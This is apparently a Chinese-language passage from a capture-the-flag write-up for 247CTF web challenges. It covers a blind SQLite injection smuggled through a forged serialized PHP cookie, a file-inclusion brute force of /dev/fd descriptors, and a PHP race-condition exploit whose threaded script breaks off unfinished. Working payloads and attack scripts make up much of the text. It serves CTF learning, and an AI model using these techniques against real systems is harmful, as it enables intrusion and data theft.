    import requests
    import base64
    import time 
    proxy = '127.0.0.1:30000'
    proxies = {
        'http': 'socks5://' + proxy,
        'https': 'socks5://' + proxy
    }
    url = 'https://03644f6a6e290136.247ctf.com/'
    def get_cookies(payload):
        serial = 'O:10:"insert_log":1:{s:8:"new_data";s:'+str(len(payload))+':"'+payload+'";}'
        res = base64.b64encode(serial.encode())
        res = res.decode() + '.0e'
        return res
    def exp():
        flag = ''
        for i in range(1, 50):
            low = 32
            high = 126
            mid = (low+high)//2
            print(flag)
            while low '{tmp}') then randomblob(1000000000) else 0 end);--"
                # payload = f"0');select 1 where 1=(case when(substr((select name from sqlite_master where type='table' limit 0,1),1,{i})>'{tmp}') then randomblob(1000000000) else 0 end);--"
                # payload = f"0');select 1 where 1=(case when(substr((select name from PRAGMA_TABLE_INFO('flag') limit 0,1),1,{i})>'{tmp}') then randomblob(1000000000) else 0 end);--"
                payload = f"0');select 1 where 1=(case when(substr((select flag from flag limit 0,1),1,{i})>'{tmp}') then randomblob(1000000000) else 0 end);--"
                print(payload)
                cookies = {
                '247': get_cookies(payload),
                }
                r = requests.get(url=url,cookies=cookies,proxies=proxies)
                code = r.status_code
                if code == 200:
                    high = mid
                if code == 502:
                    low = mid + 1
                mid = (low+high)//2
                if low == high:
                    flag = flag + chr(low)
                    break
    exp()
## FORGOTTEN FILE POINTER——Medium
###  考点
  * 文件包含Linux文件描述符
###  描述
We have opened the flag, but forgot to read and print it. Can you access it
anyway?
###  题目分析
很经典的文件包含题目
在Linux中，所有东西都是文件。用`fopen`函数打开`/tmp/flag.txt`，这时候会新建一个文件描述符指向`/tmp/flag.txt`。Linux下`/dev/fd`目录是记录用户打开的文件描述符，一般0代表标准输入，1代表标准输出。
题目长度限制不超过10，`/dev/fd/`总共是8位，那文件描述符的范围就是0-99，写个脚本爆破就可以了，最终flag在`/dev/fd/10`
题目名字也说了，被忘记的文件指针
    import requests
    url = 'https://510c4020b266c259.247ctf.com/'
    for i in range(0,100):
        payload = f'?include=/dev/fd/{i}'
        print(url+payload)
        r = requests.get(url+payload)
        print(r.text)
## ACID FLAG BANK——Easy
###  考点
  * PHP代码审计
  * 条件竞争代码审计
###  描述
You can purchase a flag directly from the ACID flag bank, however there aren’t
enough funds in the entire bank to complete that transaction! Can you identify
any vulnerabilities within the ACID flag bank which enable you to increase the
total available funds?
###  题目分析
首先给了`ChallDB`类，有一个`__construct`函数，初始化pdo和flag，其他的函数先不看。紧接着new一个`ChallDB`的实例化对象
    class ChallDB
    {
        public function __construct($flag)
        {
            $this->pdo = new SQLite3('/tmp/users.db');
            $this->flag = $flag;
        }
    }
    $db = new challDB($flag);
下面来到输入数据的部分
如果GET参数`dump`，会执行`dumpUsers`函数，输出所有用户的信息
        public function dumpUsers()
        {
            $result = $this->pdo->query("select id, funds from users");
            echo "";
            echo "ID FUNDS\n";
            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                echo "{$row['id']}  {$row['funds']}\n";
            }
            echo "";
        }
如果GET参数`reset`，会执行`resetFunds`函数，将用户的信息重置
        public function resetFunds()
        {
            $this->updateFunds(1, 247);
            $this->updateFunds(2, 0);
            return "Funds updated!";
        }
        public function updateFunds($id, $funds)
        {
            $stmt = $this->pdo->prepare('update users set funds = :funds where id = :id');
            $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
            $stmt->bindValue(':funds', $funds, SQLITE3_INTEGER);
            return $stmt->execute();
        }
如果GET参数`flag`和`from`，会先执行`clean`函数对`from`进行清洗，然后执行`buyFlag`函数购买flag
`clean`函数将传入的`from`强制转换为数字，如果是浮点数就进行四舍五入，然后赋值给`$from`
`buyFlag`函数会先检测输入的用户id是否存在，再判断它的钱够不够`247`，够的话就返回flag
        public function clean($x)
        {
            return round((int)trim($x));
        }
        public function buyFlag($id)
        {
            if ($this->validUser($id) && $this->getFunds($id) > 247) {
                return $this->flag;
            } else {
                return "Insufficient funds!";
            }
        }
        public function validUser($id)
        {
            $stmt = $this->pdo->prepare('select count(*) as valid from users where id = :id');
            $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
            $result = $stmt->execute();
            $row = $result->fetchArray(SQLITE3_ASSOC);
            return $row['valid'] == true;
        }
        public function getFunds($id)
        {
            $stmt = $this->pdo->prepare('select funds from users where id = :id');
            $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
            $result = $stmt->execute();
            return $result->fetchArray(SQLITE3_ASSOC)['funds'];
        }
如果GET参数`to`、`from`和`amount`，先执行`clean`函数对三个参数进行清洗，然后让`from`的用户金币减少`amount`个，让`to`的用户增加`amount`个，且`from`用户的金币要大于等于`amount`个。这个就相当于`from`从`to`那里买了价值`amount`的东西
        $to = $db->clean($_GET['to']);
        $from = $db->clean($_GET['from']);
        $amount = $db->clean($_GET['amount']);
        if ($to !== $from && $amount > 0 && $amount validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
            $db->updateFunds($from, $db->getFunds($from) - $amount);
            $db->updateFunds($to, $db->getFunds($to) + $amount);
            echo "Funds transferred!";
        } else {
            echo "Invalid transfer request!";
        }
这里check表面上看没什么问题，但是如果
1给2打钱和2给1打钱，同时在`$db->getFunds($from) >=
$amount`这个check前发生，那不就可以绕过这个check实现打钱，也就是条件竞争。这里有写好的工具：
设置两个`requests`，参数分别填写`?to=1&from=2&amount=1`和`?to=2&from=1&amount=1`，再添加自己的cookie，最后启动工具跑就行了。跑完看一下`?dump`是否如下满足条件（任一用户金币大于247），满足的话就直接购买即可`?flag&from=1`
###  条件竞争方法
  * 
  * 自己写脚本(这个有问题)
    #coding=utf-8 
    import io
    import requests
    import threading
    header = {
        'Cookie' : "_ga=GA1.2.1547995919.1611847143; __stripe_mid=32932a70-ec67-4b18-b1dc-af3638f802ab3ee642"
    }
    f = open('res.txt','w')
    def check(session):
        while True:
            url1 = "https://54127da6b7dbd39f.247ctf.com/?dump"
            res = session.get(url1,headers=header)
            if ('1 0' in res.text) and ('2 0' in res.text):
                url1 = "https://54127da6b7dbd39f.247ctf.com/?reset"
                res = session.get(url1,headers=header)
    def From1to2(session):
        while True:
            url1 = "https://54127da6b7dbd39f.247ctf.com/?to=2&from=1&amount=1"
            res = session.get(url1,headers=header)
            print(res.text.strip())
    def From2to1(session):
        while True:
            url2 = "https://54127da6b7dbd39f.247ctf.com/?to=1&from=2&amount=1"
            res = session.get(url2,headers=header)
            print(res.text.strip())
    def getFlag(session):
        while True:
            url1_flag = "https://54127da6b7dbd39f.247ctf.com/?flag&from=1"
            url2_flag = 'https://54127da6b7dbd39f.247ctf.com/?flag&from=2'
            res_1 = session.get(url1_flag,headers=header)
            res_2 = session.get(url2_flag,headers=header)
            if ('CTF' in res_1.text) or ('CTF' in res_2.text):
                f.write(res_1.text)
                f.write(res_2.text)
                f.close()
                exit()
    if __name__=="__main__":
        event=threading.Event()
        with requests.session() as session: